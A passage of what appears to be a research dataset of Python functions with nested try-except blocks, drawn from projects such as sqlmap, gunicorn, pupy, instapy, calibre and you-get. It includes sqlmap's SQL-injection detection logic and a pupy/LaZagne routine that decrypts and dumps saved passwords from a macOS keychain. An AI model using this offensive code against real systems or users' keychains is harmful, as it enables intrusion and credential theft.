                                    if threadData.lastErrorPage and threadData.lastErrorPage[1]:
                                        errorSet = set(getFilteredPageContent(threadData.lastErrorPage[1], True, ""\n"").split(""\n""))
                                    else:
                                        errorSet = set()

                                    if originalSet == trueSet != falseSet:
                                        candidates = trueSet - falseSet - errorSet

                                        if candidates:
                                            candidates = sorted(candidates, key=len)
                                            for candidate in candidates:
                                                if re.match(r""\A[\w.,! ]+\Z"", candidate) and ' ' in candidate and candidate.strip() and len(candidate) > CANDIDATE_SENTENCE_MIN_LENGTH:
                                                    suggestion = conf.string = candidate
                                                    injectable = True

                                                    infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --string=\""%s\"")"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, repr(conf.string).lstrip('u').strip(""'""))
                                                    logger.info(infoMsg)

                                                    break

                            if injectable:
                                if kb.pageStable and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                    if all((falseCode, trueCode)) and falseCode != trueCode:
                                        suggestion = conf.code = trueCode

                                        infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --code=%d)"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, conf.code)
                                        logger.info(infoMsg)
                                    else:
                                        trueSet = set(extractTextTagContent(trueRawResponse))
                                        trueSet |= set(__ for _ in trueSet for __ in _.split())

                                        falseSet = set(extractTextTagContent(falseRawResponse))
                                        falseSet |= set(__ for _ in falseSet for __ in _.split())

                                        if threadData.lastErrorPage and threadData.lastErrorPage[1]:
                                            errorSet = set(extractTextTagContent(threadData.lastErrorPage[1]))
                                            errorSet |= set(__ for _ in errorSet for __ in _.split())
                                        else:
                                            errorSet = set()

                                        candidates = filterNone(_.strip() if _.strip() in trueRawResponse and _.strip() not in falseRawResponse else None for _ in (trueSet - falseSet - errorSet))

                                        if candidates:
                                            candidates = sorted(candidates, key=len)
                                            for candidate in candidates:
                                                if re.match(r""\A\w{2,}\Z"", candidate):  # Note: length of 1 (e.g. --string=5) could cause trouble, especially in error message pages with partially reflected payload content
                                                    break

                                            suggestion = conf.string = candidate

                                            infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --string=\""%s\"")"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, repr(conf.string).lstrip('u').strip(""'""))
                                            logger.info(infoMsg)

                                        if not any((conf.string, conf.notString)):
                                            candidates = filterNone(_.strip() if _.strip() in falseRawResponse and _.strip() not in trueRawResponse else None for _ in (falseSet - trueSet))

                                            if candidates:
                                                candidates = sorted(candidates, key=len)
                                                for candidate in candidates:
                                                    if re.match(r""\A\w+\Z"", candidate):
                                                        break

                                                suggestion = conf.notString = candidate

                                                infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --not-string=\""%s\"")"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, repr(conf.notString).lstrip('u').strip(""'""))
                                                logger.info(infoMsg)

                                if not suggestion:
                                    infoMsg = ""%sparameter '%s' appears to be '%s' injectable "" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                    singleTimeLogMessage(infoMsg)

                        # In case of error-based SQL injection
                        elif method == PAYLOAD.METHOD.GREP:
                            # Perform the test's request and grep the response
                            # body for the test's <grep> regular expression
                            try:
                                page, headers, _ = Request.queryPage(reqPayload, place, content=True, raise404=False)
                                output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE)
                                output = output or extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None, re.DOTALL | re.IGNORECASE)
                                output = output or extractRegexResult(check, listToStrValue((headers[key] for key in headers if key.lower() != URI_HTTP_HEADER.lower()) if headers else None), re.DOTALL | re.IGNORECASE)
                                output = output or extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

                                if output:
                                    result = output == '1'

                                    if result:
                                        infoMsg = ""%sparameter '%s' is '%s' injectable "" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                        logger.info(infoMsg)

                                        injectable = True

                            except SqlmapConnectionException as ex:
                                debugMsg = ""problem occurred most likely because the ""
                                debugMsg += ""server hasn't recovered as expected from the ""
                                debugMsg += ""used error-based payload ('%s')"" % getSafeExString(ex)
                                logger.debug(debugMsg)

                        # In case of time-based blind or stacked queries
                        # SQL injections
                        elif method == PAYLOAD.METHOD.TIME:
                            # Perform the test's request
                            trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)
                            trueCode = threadData.lastCode

                            if trueResult:
                                # Extra validation step (e.g. to check for DROP protection mechanisms)
                                if SLEEP_TIME_MARKER in reqPayload:
                                    falseResult = Request.queryPage(reqPayload.replace(SLEEP_TIME_MARKER, ""0""), place, timeBasedCompare=True, raise404=False)
                                    if falseResult:
                                        continue

                                # Confirm test's results
                                trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)

                                if trueResult:
                                    infoMsg = ""%sparameter '%s' appears to be '%s' injectable "" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                        # In case of UNION query SQL injection
                        elif method == PAYLOAD.METHOD.UNION:
                            # Test for UNION injection and set the sample
                            # payload as well as the vector.
                            # NOTE: vector is set to a tuple with 6 elements,
                            # used afterwards by Agent.forgeUnionQuery()
                            # method to forge the UNION query payload

                            configUnion(test.request.char, test.request.columns)

                            if len(kb.dbmsFilter or []) == 1:
                                Backend.forceDbms(kb.dbmsFilter[0])
                            elif not Backend.getIdentifiedDbms():
                                if kb.heuristicDbms is None:
                                    if kb.heuristicTest == HEURISTIC_TEST.POSITIVE or injection.data:
                                        warnMsg = ""using unescaped version of the test ""
                                        warnMsg += ""because of zero knowledge of the ""
                                        warnMsg += ""back-end DBMS. You can try to ""
                                        warnMsg += ""explicitly set it with option '--dbms'""
                                        singleTimeWarnMessage(warnMsg)
                                else:
                                    Backend.forceDbms(kb.heuristicDbms)

                            if unionExtended:
                                infoMsg = ""automatically extending ranges for UNION ""
                                infoMsg += ""query injection technique tests as ""
                                infoMsg += ""there is at least one other (potential) ""
                                infoMsg += ""technique found""
                                singleTimeLogMessage(infoMsg)

                            # Test for UNION query SQL injection
                            reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)

                            if isinstance(reqPayload, six.string_types):
                                infoMsg = ""%sparameter '%s' is '%s' injectable"" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                logger.info(infoMsg)

                                injectable = True

                                # Overwrite 'where' because it can be set
                                # by unionTest() directly
                                where = vector[6]

                        kb.previousMethod = method

                        if conf.offline:
                            injectable = False

                    # If the injection test was successful feed the injection
                    # object with the test's details
                    if injectable is True:
                        # Feed with the boundaries details only the first time a
                        # test has been successful
                        if injection.place is None or injection.parameter is None:
                            if place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):
                                injection.parameter = place
                            else:
                                injection.parameter = parameter

                            injection.place = place
                            injection.ptype = ptype
                            injection.prefix = prefix
                            injection.suffix = suffix
                            injection.clause = clause

                        # Feed with test details every time a test is successful
                        if hasattr(test, ""details""):
                            for key, value in test.details.items():
                                if key == ""dbms"":
                                    injection.dbms = value

                                    if not isinstance(value, list):
                                        Backend.setDbms(value)
                                    else:
                                        Backend.forceDbms(value[0], True)

                                elif key == ""dbms_version"" and injection.dbms_version is None and not conf.testFilter:
                                    injection.dbms_version = Backend.setVersion(value)

                                elif key == ""os"" and injection.os is None:
                                    injection.os = Backend.setOs(value)

                        if vector is None and ""vector"" in test and test.vector is not None:
                            vector = test.vector

                        injection.data[stype] = AttribDict()
                        injection.data[stype].title = title
                        injection.data[stype].payload = agent.removePayloadDelimiters(reqPayload)
                        injection.data[stype].where = where
                        injection.data[stype].vector = vector
                        injection.data[stype].comment = comment
                        injection.data[stype].templatePayload = templatePayload
                        injection.data[stype].matchRatio = kb.matchRatio
                        injection.data[stype].trueCode = trueCode
                        injection.data[stype].falseCode = falseCode

                        injection.conf.textOnly = conf.textOnly
                        injection.conf.titles = conf.titles
                        injection.conf.code = conf.code
                        injection.conf.string = conf.string
                        injection.conf.notString = conf.notString
                        injection.conf.regexp = conf.regexp
                        injection.conf.optimize = conf.optimize

                        if conf.beep:
                            beep()

                        # There is no need to perform this test for other
                        # <where> tags
                        break

                if injectable is True:
                    kb.vulnHosts.add(conf.hostname)
                    break

            # Reset forced back-end DBMS value
            Backend.flushForcedDbms()

        except KeyboardInterrupt:
            warnMsg = ""user aborted during detection phase""
            logger.warning(warnMsg)

            if conf.multipleTargets:
                msg = ""how do you want to proceed? [ne(X)t target/(s)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit]""
                choice = readInput(msg, default='X', checkBatch=False).upper()
            else:
                msg = ""how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit]""
                choice = readInput(msg, default='S', checkBatch=False).upper()

            if choice == 'X':
                if conf.multipleTargets:
                    raise SqlmapSkipTargetException
            elif choice == 'C':
                choice = None
                while not ((choice or """").isdigit() and 0 <= int(choice) <= 6):
                    if choice:
                        logger.warning(""invalid value"")
                    msg = ""enter new verbosity level: [0-6] ""
                    choice = readInput(msg, default=str(conf.verbose), checkBatch=False)
                conf.verbose = int(choice)
                setVerbosity()
                tests.insert(0, test)
            elif choice == 'N':
                return None
            elif choice == 'E':
                kb.endDetection = True
            elif choice == 'Q':
                raise SqlmapUserQuitException

        finally:
            # Reset forced back-end DBMS value
            Backend.flushForcedDbms()

    Backend.flushForcedDbms(True)

    # Return the injection object
    if injection.place is not None and injection.parameter is not None:
        if not conf.dropSetCookie and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data and injection.data[PAYLOAD.TECHNIQUE.BOOLEAN].vector.startswith('OR'):
            warnMsg = ""in OR boolean-based injection cases, please consider usage ""
            warnMsg += ""of switch '--drop-set-cookie' if you experience any ""
            warnMsg += ""problems during data retrieval""
            logger.warning(warnMsg)

        if not checkFalsePositives(injection):
            if conf.hostname in kb.vulnHosts:
                kb.vulnHosts.remove(conf.hostname)
            if NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:
                injection.notes.append(NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE)
    else:
        injection = None

    if injection and NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:
        checkSuhosinPatch(injection)
        checkFilteredChars(injection)

    return injection",Nested Try-Except Blocks,1
248,gunicorn,/home/r4ph/desenv/phd/exception-miner/projects/py/gunicorn/gunicorn/pidfile.py,validate,"def validate(self):
        """""" Validate pidfile and make it stale if needed""""""
        if not self.fname:
            return
        try:
            with open(self.fname, ""r"") as f:
                try:
                    wpid = int(f.read())
                except ValueError:
                    return

                try:
                    os.kill(wpid, 0)
                    return wpid
                except OSError as e:
                    if e.args[0] == errno.EPERM:
                        return wpid
                    if e.args[0] == errno.ESRCH:
                        return
                    raise
        except IOError as e:
            if e.args[0] == errno.ENOENT:
                return
            raise",Nested Try-Except Blocks,1
249,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/external/LaZagne/Mac/lazagne/softwares/system/chainbreaker_module/chainbreaker.py,dump_creds,"def dump_creds(keychain_file, password=None, key=None):
    keychain = KeyChain(keychain_file)

    if keychain.open() is False:
        print_debug('ERROR', '%s Open Failed' % keychain_file)
        return False

    KeychainHeader = keychain.getHeader()

    if KeychainHeader.Signature != KEYCHAIN_SIGNATURE:
        print_debug('ERROR', 'Invalid Keychain Format')
        return False

    SchemaInfo, TableList = keychain.getSchemaInfo(KeychainHeader.SchemaOffset)

    TableMetadata, RecordList = keychain.getTable(TableList[0])

    tableCount, tableEnum = keychain.getTablenametoList(RecordList, TableList)

    # generate database key
    if password:
        masterkey = keychain.generateMasterKey(password, TableList[tableEnum[CSSM_DL_DB_RECORD_METADATA]])
        dbkey = keychain.findWrappingKey(masterkey, TableList[tableEnum[CSSM_DL_DB_RECORD_METADATA]])
    else:
        dbkey = keychain.findWrappingKey(unhexlify(key), TableList[tableEnum[CSSM_DL_DB_RECORD_METADATA]])

    # DEBUG
    print_debug('DEBUG', 'DB Key: %s' % str(repr(dbkey)))

    key_list = {}  # keyblob list

    # get symmetric key blob
    print_debug('DEBUG', 'Symmetric Key Table: 0x%.8x' % (
                sizeof(_APPL_DB_HEADER) + TableList[tableEnum[CSSM_DL_DB_RECORD_SYMMETRIC_KEY]]))
    TableMetadata, symmetrickey_list = keychain.getTable(TableList[tableEnum[CSSM_DL_DB_RECORD_SYMMETRIC_KEY]])

    for symmetrickey_record in symmetrickey_list:
        keyblob, ciphertext, iv, return_value = keychain.getKeyblobRecord(
            TableList[tableEnum[CSSM_DL_DB_RECORD_SYMMETRIC_KEY]],
            symmetrickey_record)
        if return_value == 0:
            passwd = keychain.KeyblobDecryption(ciphertext, iv, dbkey)
            if passwd != '':
                key_list[keyblob] = passwd

    pwdFound = []
    legend = ['', 'Create DateTime', 'Last Modified DateTime', 'Description', 'Creator', 'Type', 'PrintName', 'Alias',
              'Account', 'Service']

    try:
        TableMetadata, genericpw_list = keychain.getTable(TableList[tableEnum[CSSM_DL_DB_RECORD_GENERIC_PASSWORD]])

        for genericpw in genericpw_list:
            record = keychain.getGenericPWRecord(TableList[tableEnum[CSSM_DL_DB_RECORD_GENERIC_PASSWORD]], genericpw)
            # print '[+] Generic Password Record'
            try:
                real_key = key_list[record[0][0:20]]
                passwd = keychain.SSGPDecryption(record[0], real_key)
            except KeyError:
                passwd = ''

            if passwd:
                values = {}
                for cpt in range(1, len(record)):
                    if record[cpt]:
                        values[legend[cpt]] = unicode(record[cpt])

                try:
                    values['Password'] = unicode(passwd)
                except:
                    values['Password'] = unicode(repr(passwd))

                pwdFound.append(values)

    except KeyError:
        print_debug('INFO', 'Generic Password Table is not available')
        pass

    legend = ['', 'Create DateTime', 'Last Modified DateTime', 'Description', 'Comment', 'Creator', 'Type', 'PrintName',
              'Alias', 'Protected', 'Account', 'SecurityDomain', 'Server', 'Protocol Type', 'Auth Type', 'Port', 'Path']
    try:
        TableMetadata, internetpw_list = keychain.getTable(TableList[tableEnum[CSSM_DL_DB_RECORD_INTERNET_PASSWORD]])

        for internetpw in internetpw_list:
            record = keychain.getInternetPWRecord(TableList[tableEnum[CSSM_DL_DB_RECORD_INTERNET_PASSWORD]], internetpw)
            try:
                real_key = key_list[record[0][0:20]]
                passwd = keychain.SSGPDecryption(record[0], real_key)
            except KeyError:
                passwd = ''

            if passwd:
                values = {}
                for cpt in range(1, len(record)):
                    if record[cpt]:
                        values[legend[cpt]] = record[cpt]

                try:
                    values['Password'] = unicode(passwd)
                except Exception:
                    values['Password'] = unicode(repr(passwd))

                pwdFound.append(values)

    except KeyError:
        print_debug('INFO', 'Internet Password Table is not available')
        pass

    return pwdFound",Nested Try-Except Blocks,1
250,instapy,/home/r4ph/desenv/phd/exception-miner/projects/py/instapy/instapy/relationship_tools.py,get_following,"def get_following(
    browser,
    self_username,
    username,
    grab,
    relationship_data,
    live_match,
    store_locally,
    logger,
    logfolder,
):
    """"""Get entire list of following using graphql queries.""""""

    # Variables
    user_data = {}
    variables = {}

    if username not in relationship_data:
        relationship_data.update({username: {""all_following"": [], ""all_followers"": []}})

    grab_info = (
        'at ""full"" range' if grab == ""full"" else ""at the range of {}"".format(grab)
    )
    tense = (
        ""live""
        if (live_match is True or not relationship_data[username][""all_following""])
        else ""fresh""
    )

    logger.info(
        ""Retrieving {} `Following` data of {} {}"".format(tense, username, grab_info)
    )

    user_link = ""https://www.instagram.com/{}/"".format(username)
    web_address_navigator(browser, user_link)

    # Get following count
    _, following_count = get_relationship_counts(browser, username, logger)

    if grab != ""full"" and grab > following_count:
        logger.info(
            ""You have requested higher amount than existing following count ""
            "" ~gonna grab all available""
        )
        grab = following_count

    # Check if user's account is private and we don't follow
    following_status, _ = get_following_status(
        browser, ""profile"", self_username, username, None, logger, logfolder
    )

    is_private = is_private_profile(browser, logger, following_status == ""Following"")
    if not username == self_username and (
        is_private is None
        or (is_private is True and following_status not in [""Following"", True])
        or (following_status == ""Blocked"")
    ):
        logger.info(
            ""This user is private and we are not following. '{}':'{}'"".format(
                is_private, following_status
            )
        )
        return False

    # sets the amount of usernames to be matched in the next queries
    match = (
        None
        if live_match is True
        else 10
        if relationship_data[username][""all_following""]
        else None
    )

    # if there has been prior graphql query, use that existing data to speed
    # up querying time
    all_prior_following = (
        relationship_data[username][""all_following""] if match is not None else None
    )

    # FIXME: use util.py:get_query_hash to get the hash code
    graphql_endpoint = ""view-source:https://www.instagram.com/graphql/query/""

    graphql_following = (
        graphql_endpoint + ""?query_hash=58712303d941c6855d4e888c5f0cd22f""
    )

    try:
        user_data[""id""] = browser.execute_script(
            ""return window.__additionalData[Object.keys(window.__additionalData)[0]].data.""
            ""graphql.user.id""
        )
    except WebDriverException:
        user_data[""id""] = browser.execute_script(
            ""return window._sharedData.entry_data.ProfilePage[0].graphql.user.id""
        )

    variables[""id""] = user_data[""id""]
    variables[""first""] = 50

    # get follower and user loop

    sc_rolled = 0
    grab_notifier = False
    local_read_failure = False
    passed_time = ""time loop""
    all_following = []

    try:
        filename = None
        query_date = None
        graphql_queries = None
        has_next_data = True

        url = ""{}&variables={}"".format(graphql_following, str(json.dumps(variables)))
        web_address_navigator(browser, url)

        # Get stored graphql queries data to be used
        try:
            filename = ""{}graphql_queries.json"".format(logfolder)
            query_date = datetime.today().strftime(""%d-%m-%Y"")
            if not os.path.isfile(filename):
                with interruption_handler():
                    with open(filename, ""w"") as graphql_queries_file:
                        json.dump(
                            {username: {query_date: {""sc_rolled"": 0}}},
                            graphql_queries_file,
                        )
                        graphql_queries_file.close()

            # Loads the existing graphql queries data
            with open(filename) as graphql_queries_file:
                graphql_queries = json.load(graphql_queries_file)
                stored_usernames = list(name for name, date in graphql_queries.items())
                if username not in stored_usernames:
                    graphql_queries[username] = {query_date: {""sc_rolled"": 0}}
                stored_query_dates = list(
                    date for date, score in graphql_queries[username].items()
                )
                if query_date not in stored_query_dates:
                    graphql_queries[username][query_date] = {""sc_rolled"": 0}
        except Exception as exc:
            logger.info(
                ""Error occurred while getting `scroll` data from ""
                ""graphql_queries.json\n{}\n"".format(str(exc).encode(""utf-8""))
            )
            local_read_failure = True

        start_time = time.time()
        highest_value = following_count if grab == ""full"" else grab
        # fetch all user while still has data
        while has_next_data:
            try:
                pre = browser.find_element(By.TAG_NAME, ""pre"").text
            except NoSuchElementException as exc:
                logger.info(
                    ""Encountered an error to find `pre` in page!""
                    ""\t~grabbed {} usernames \n\t{}"".format(
                        len(set(all_following)), str(exc).encode(""utf-8"")
                    )
                )
                return all_following

            data = json.loads(pre)[""data""]

            # get following
            page_info = data[""user""][""edge_follow""][""page_info""]
            edges = data[""user""][""edge_follow""][""edges""]
            for user in edges:
                all_following.append(user[""node""][""username""])

            grabbed = len(set(all_following))

            # write & update records at Progress Tracker
            progress_tracker(grabbed, highest_value, start_time, logger)
            print(""\n"")

            finish_time = time.time()
            diff_time = finish_time - start_time
            diff_n, diff_s = (
                (diff_time / 60 / 60, ""hours"")
                if diff_time / 60 / 60 >= 1
                else (diff_time / 60, ""minutes"")
                if diff_time / 60 >= 1
                else (diff_time, ""seconds"")
            )
            diff_n = truncate_float(diff_n, 2)
            passed_time = ""{} {}"".format(diff_n, diff_s)

            if match is not None:
                matched_following = len(set(all_following)) - len(
                    set(all_following) - set(all_prior_following)
                )
                if matched_following >= match:
                    new_following = set(all_following) - set(all_prior_following)
                    all_following = all_following + all_prior_following
                    logger.info(
                        ""Grabbed {} new usernames from `Following` in {}  ""
                        ""~total of {} usernames"".format(
                            len(set(new_following)),
                            passed_time,
                            len(set(all_following)),
                        )
                    )
                    grab_notifier = True
                    break

            if grab != ""full"" and grabbed >= grab:
                logger.info(
                    ""Grabbed {} usernames from `Following` as requested at {}"".format(
                        grabbed, passed_time
                    )
                )
                grab_notifier = True
                break

            has_next_data = page_info[""has_next_page""]
            if has_next_data:
                variables[""after""] = page_info[""end_cursor""]

                url = ""{}&variables={}"".format(
                    graphql_following, str(json.dumps(variables))
                )

                web_address_navigator(browser, url)
                sc_rolled += 1

                # dumps the current graphql queries data
                if local_read_failure is not True:
                    try:
                        with interruption_handler():
                            with open(filename, ""w"") as graphql_queries_file:
                                graphql_queries[username][query_date][""sc_rolled""] += 1
                                json.dump(graphql_queries, graphql_queries_file)
                    except Exception as exc:
                        logger.info(
                            ""Error occurred while writing `scroll` data to ""
                            ""graphql_queries.json\n{}\n"".format(
                                str(exc).encode(""utf-8"")
                            )
                        )

                # take breaks gradually
                if sc_rolled > 91:
                    logger.info(""Queried too much! ~ sleeping a bit :>"")
                    sleep(600)
                    sc_rolled = 0

    except BaseException as exc:
        logger.info(
            ""Unable to get `Following` data:\n\t{}\n"".format(str(exc).encode(""utf-8""))
        )

    # remove possible duplicates
    all_following = sorted(set(all_following), key=lambda x: all_following.index(x))

    if grab_notifier is False:
        logger.info(
            ""Grabbed {} usernames from `Following` in {}"".format(
                len(all_following), passed_time
            )
        )

    if len(all_following) > 0:
        if (
            store_locally is True
            and relationship_data[username][""all_following""] != all_following
        ):
            store_following_data(username, grab, all_following, logger, logfolder)
        elif store_locally is True:
            logger.info(
                ""The `Following` data is identical with the data in previous ""
                ""query  ~not storing the file again""
            )

        if grab == ""full"":
            relationship_data[username].update({""all_following"": all_following})

    sleep_t = sc_rolled * 6
    sleep_t = sleep_t if sleep_t < 600 else random.randint(585, 655)
    sleep_n, sleep_s = (
        (sleep_t / 60, ""minutes"") if sleep_t / 60 >= 1 else (sleep_t, ""seconds"")
    )
    sleep_n = truncate_float(sleep_n, 4)

    logger.info(
        ""Zz :[ time to take a good nap  ~sleeping {} {}"".format(sleep_n, sleep_s)
    )
    sleep(sleep_t)
    logger.info(""Yawn :] let's go!\n"")

    return all_following",Nested Try-Except Blocks,1
251,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/devices/__init__.py,debug,"def debug(ioreg_to_tmp=False, buf=None, plugins=None,
        disabled_plugins=None):
    '''
    If plugins is None, then this method calls startup and shutdown on the
    device plugins. So if you are using it in a context where startup could
    already have been called (for example in the main GUI), pass in the list of
    device plugins as the plugins parameter.
    '''
    import textwrap
    from calibre.customize.ui import device_plugins, disabled_device_plugins
    from calibre.debug import print_basic_debug_info
    from calibre.devices.scanner import DeviceScanner
    from calibre.constants import iswindows, ismacos, debug, is_debugging
    from calibre import prints
    from polyglot.io import PolyglotStringIO
    oldo, olde = sys.stdout, sys.stderr

    if buf is None:
        buf = PolyglotStringIO()
    sys.stdout = sys.stderr = buf
    out = partial(prints, file=buf)

    devplugins = device_plugins() if plugins is None else plugins
    devplugins = list(sorted(devplugins, key=lambda x: x.__class__.__name__))
    if plugins is None:
        for d in devplugins:
            try:
                d.startup()
            except:
                out('Startup failed for device plugin: %s'%d)

    if disabled_plugins is None:
        disabled_plugins = list(disabled_device_plugins())

    orig_debug = is_debugging()
    debug(True)
    try:
        print_basic_debug_info(out=buf)
        s = DeviceScanner()
        s.scan()
        devices = (s.devices)
        if not iswindows:
            devices = [list(x) for x in devices]
            for d in devices:
                for i in range(3):
                    d[i] = hex(d[i])
        out('USB devices on system:')
        out(pprint.pformat(devices))

        ioreg = None
        if ismacos:
            from calibre.devices.usbms.device import Device
            mount = '\n'.join(repr(x) for x in Device.osx_run_mount().splitlines())
            drives = pprint.pformat(Device.osx_get_usb_drives())
            ioreg = 'Output from mount:\n'+mount+'\n\n'
            ioreg += 'Output from osx_get_usb_drives:\n'+drives+'\n\n'
            iro = Device.run_ioreg()
            try:
                ioreg += iro.decode('utf-8', 'replace')
            except UnicodeDecodeError:
                ioreg += repr(iro)
        connected_devices = []
        if disabled_plugins:
            out('\nDisabled plugins:', textwrap.fill(' '.join([x.__class__.__name__ for x in
                disabled_plugins])))
            out(' ')
        else:
            out('\nNo disabled plugins')
        found_dev = False
        for dev in devplugins:
            if not dev.MANAGES_DEVICE_PRESENCE:
                continue
            out('Looking for devices of type:', dev.__class__.__name__)
            if dev.debug_managed_device_detection(s.devices, buf):
                found_dev = True
                break
            out(' ')

        if not found_dev:
            out('Looking for devices...')
            for dev in devplugins:
                if dev.MANAGES_DEVICE_PRESENCE:
                    continue
                connected, det = s.is_device_connected(dev, debug=True)
                if connected:
                    out('\t\tDetected possible device', dev.__class__.__name__)
                    connected_devices.append((dev, det))

            out(' ')
            errors = {}
            success = False
            out('Devices possibly connected:', end=' ')
            for dev, det in connected_devices:
                out(dev.name, end=', ')
            if not connected_devices:
                out('None', end='')
            out(' ')
            for dev, det in connected_devices:
                out('Trying to open', dev.name, '...', end=' ')
                dev.do_device_debug = True
                try:
                    dev.reset(detected_device=det)
                    dev.open(det, None)
                    out('OK')
                except:
                    import traceback
                    errors[dev] = traceback.format_exc()
                    out('failed')
                    continue
                dev.do_device_debug = False
                success = True
                if hasattr(dev, '_main_prefix'):
                    out('Main memory:', repr(dev._main_prefix))
                out('Total space:', dev.total_space())
                break
            if not success and errors:
                out('Opening of the following devices failed')
                for dev,msg in errors.items():
                    out(dev)
                    out(msg)
                    out(' ')

            if ioreg is not None:
                ioreg = 'IOREG Output\n'+ioreg
                out(' ')
                if ioreg_to_tmp:
                    open('/tmp/ioreg.txt', 'w').write(ioreg)
                    out('Dont forget to send the contents of /tmp/ioreg.txt')
                    out('You can open it with the command: open /tmp/ioreg.txt')
                else:
                    out(ioreg)

        if hasattr(buf, 'getvalue'):
            return buf.getvalue()
    finally:
        debug(orig_debug)
        sys.stdout = oldo
        sys.stderr = olde
        if plugins is None:
            for d in devplugins:
                try:
                    d.shutdown()
                except:
                    pass",Nested Try-Except Blocks,1
252,you-get,/home/r4ph/desenv/exception-miner/projects/py/you-get/src/you_get/extractors/youtube.py,prepare,"def prepare(self, **kwargs):
        assert self.url or self.vid

        if not self.vid and self.url:
            self.vid = self.__class__.get_vid_from_url(self.url)

            if self.vid is None:
                self.download_playlist_by_url(self.url, **kwargs)
                exit(0)

        if re.search('\Wlist=', self.url) and not kwargs.get('playlist'):
            log.w('This video is from a playlist. (use --playlist to download all videos in the playlist.)')

        # Get video info
        # 'eurl' is a magic parameter that can bypass age restriction
        # full form: 'eurl=https%3A%2F%2Fyoutube.googleapis.com%2Fv%2F{VIDEO_ID}'
        #video_info = parse.parse_qs(get_content('https://www.youtube.com/get_video_info?video_id={}&eurl=https%3A%2F%2Fy'.format(self.vid)))
        #logging.debug('STATUS: %s' % video_info['status'][0])
        video_info = {'status': ['ok'], 'use_cipher_signature': 'True'}

        ytplayer_config = None
        if 'status' not in video_info:
            log.wtf('[Failed] Unknown status.', exit_code=None)
            raise
        elif video_info['status'] == ['ok']:
            if 'use_cipher_signature' not in video_info or video_info['use_cipher_signature'] == ['False']:
                self.title = parse.unquote_plus(json.loads(video_info[""player_response""][0])[""videoDetails""][""title""])
                # Parse video page (for DASH)
                video_page = get_content('https://www.youtube.com/watch?v=%s' % self.vid)
                try:
                    try:
                        # Complete ytplayer_config
                        ytplayer_config = json.loads(re.search('ytplayer.config\s*=\s*([^\n]+?});', video_page).group(1))

                        # Workaround: get_video_info returns bad s. Why?
                        if 'url_encoded_fmt_stream_map' not in ytplayer_config['args']:
                            stream_list = json.loads(ytplayer_config['args']['player_response'])['streamingData']['formats']
                        else:
                            stream_list = ytplayer_config['args']['url_encoded_fmt_stream_map'].split(',')
                        #stream_list = ytplayer_config['args']['adaptive_fmts'].split(',')

                        if 'assets' in ytplayer_config:
                            self.html5player = 'https://www.youtube.com' + ytplayer_config['assets']['js']
                        elif re.search('([^""]*/base\.js)""', video_page):
                            self.html5player = 'https://www.youtube.com' + re.search('([^""]*/base\.js)""', video_page).group(1)
                            self.html5player = self.html5player.replace('\/', '/') # unescape URL
                        else:
                            self.html5player = None

                    except:
                        # ytplayer_config = {args:{raw_player_response:ytInitialPlayerResponse}}
                        try:  # FIXME: we should extract ytInitialPlayerResponse more reliably
                            ytInitialPlayerResponse = json.loads(re.search('ytInitialPlayerResponse\s*=\s*([^\n]+?});</script>', video_page).group(1))
                        except:
                            ytInitialPlayerResponse = json.loads(re.search('ytInitialPlayerResponse\s*=\s*([^\n]+?});', video_page).group(1))

                        stream_list = ytInitialPlayerResponse['streamingData']['formats']
                        #stream_list = ytInitialPlayerResponse['streamingData']['adaptiveFormats']

                        if re.search('([^""]*/base\.js)""', video_page):
                            self.html5player = 'https://www.youtube.com' + re.search('([^""]*/base\.js)""', video_page).group(1)
                        else:
                            self.html5player = None

                except:
                    if 'url_encoded_fmt_stream_map' not in video_info:
                        stream_list = json.loads(video_info['player_response'][0])['streamingData']['formats']
                    else:
                        stream_list = video_info['url_encoded_fmt_stream_map'][0].split(',')

                    if re.search('([^""]*/base\.js)""', video_page):
                        self.html5player = 'https://www.youtube.com' + re.search('([^""]*/base\.js)""', video_page).group(1)
                    else:
                        self.html5player = None

            else:
                # Parse video page instead
                video_page = get_content('https://www.youtube.com/watch?v=%s' % self.vid)

                try:  # FIXME: we should extract ytInitialPlayerResponse more reliably
                    ytInitialPlayerResponse = json.loads(re.search('ytInitialPlayerResponse\s*=\s*([^\n]+?});</script>', video_page).group(1))
                except:
                    ytInitialPlayerResponse = json.loads(re.search('ytInitialPlayerResponse\s*=\s*([^\n]+?});', video_page).group(1))

                self.title = ytInitialPlayerResponse[""videoDetails""][""title""]
                if re.search('([^""]*/base\.js)""', video_page):
                    self.html5player = 'https://www.youtube.com' + re.search('([^""]*/base\.js)""', video_page).group(1)
                else:
                    self.html5player = None

                stream_list = ytInitialPlayerResponse['streamingData']['formats']

        elif video_info['status'] == ['fail']:
            logging.debug('ERRORCODE: %s' % video_info['errorcode'][0])
            if video_info['errorcode'] == ['150']:
